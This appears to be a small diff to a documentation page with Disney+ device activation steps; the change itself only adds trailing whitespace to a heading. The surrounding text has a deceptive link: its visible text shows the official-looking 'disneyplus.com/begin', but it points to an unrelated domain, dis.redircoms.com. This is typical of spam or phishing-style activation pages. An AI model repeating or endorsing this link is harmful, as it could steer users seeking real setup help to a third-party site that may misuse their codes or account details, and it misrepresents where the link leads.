@@ -25,7 +25,7 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
 To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate Disney+ on Your Device 
 **********
 
 1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
